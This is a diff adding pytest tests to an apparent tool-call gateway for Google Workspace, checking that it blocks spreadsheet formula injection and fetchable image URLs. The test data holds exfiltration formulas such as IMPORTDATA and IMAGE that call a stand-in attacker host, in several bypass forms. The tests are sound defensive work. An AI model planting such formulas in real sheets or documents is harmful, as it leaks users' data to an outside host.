@@ -322,3 +322,65 @@ def test_deeply_nested_string_arguments_do_not_crash() -> None:
     gateway, _session_call = _make_gateway()
     result = _call(gateway, "google_workspace__get_events", "[" * 100_000)
     assert isinstance(result, str)
+
+
+# ---------------------------------------------------------------------------
+# Third review round: formula gate bypasses, URL values a parser still fetches
+# ---------------------------------------------------------------------------
+
+_FORMULA = "=IMPORTDATA(\"https://evil.example/?q=SECRET\")"
+
+
+@pytest.mark.parametrize("tool,arguments", [
+    # values JSON-encoded: the string starts with "[" not "="
+    ("google_workspace__modify_sheet_values",
+     {"spreadsheet_id": "s", "range_name": "A1", "values": json.dumps([[_FORMULA]])}),
+    ("google_workspace__append_table_rows",
+     {"spreadsheet_id": "s", "table": "t", "values": json.dumps([["=IMAGE(\"https://evil.example/x\")"]])}),
+    # a CSV cell mid-line
+    ("google_workspace__import_to_google_sheets",
+     {"file_name": "x.csv", "content": "a,b\nc," + _FORMULA}),
+    # a native Sheet rewritten from CSV through Drive — no "sheet" in the name
+    ("google_workspace__update_drive_file",
+     {"file_id": "1sheet", "mime_type": "text/csv", "content": _FORMULA}),
+    ("google_workspace__create_drive_file",
+     {"file_name": "x.csv", "content": "h\n" + _FORMULA, "content_mime_type": "text/csv"}),
+    # no "=" at all
+    ("google_workspace__modify_sheet_values",
+     {"spreadsheet_id": "s", "range_name": "A1", "values": [["+IMPORTDATA(\"https://evil.example\")"]]}),
+    # conditional formatting custom formula
+    ("google_workspace__manage_conditional_formatting",
+     {"spreadsheet_id": "s", "rules": [{"custom_formula": "=ISNUMBER(IMPORTDATA(\"https://evil.example\"))"}]}),
+])
+def test_formula_gate_bypasses_closed(tool: str, arguments: dict[str, Any]) -> None:
+    gateway, session_call = _make_gateway()
+    result = _call(gateway, tool, arguments)
+    assert session_call.await_count == 0
+    assert "formula" in json.loads(result)["error"]
+
+
+def test_plain_csv_content_passes() -> None:
+    gateway, session_call = _make_gateway()
+    _call(gateway, "google_workspace__import_to_google_sheets",
+          {"file_name": "x.csv", "content": "name,total\nacme,=SUM(B2:B9)\n"})
+    assert session_call.await_count == 1
+
+
+@pytest.mark.parametrize("value", [
+    "//evil.example/?q=S", "\x01https://evil.example/x", "\u200bhttps://evil.example/x",
+    " \t\nhttps://evil.example/x", "\ufeffdata:image/png;base64,AA",
+])
+def test_url_values_a_parser_would_still_fetch_are_refused(value: str) -> None:
+    gateway, session_call = _make_gateway()
+    result = _call(gateway, "google_workspace__batch_update_presentation",
+                   {"presentation_id": "p",
+                    "requests": [{"replaceAllShapesWithImage": {"imageUrl": value}}]})
+    assert session_call.await_count == 0
+    assert "fetch" in json.loads(result)["error"]
+
+
+def test_drive_id_with_stray_whitespace_still_passes() -> None:
+    gateway, session_call = _make_gateway()
+    _call(gateway, "google_workspace__insert_doc_image",
+          {"document_id": "d", "index": 1, "image_source": " 1AbCdEfDriveFileId "})
+    assert session_call.await_count == 1
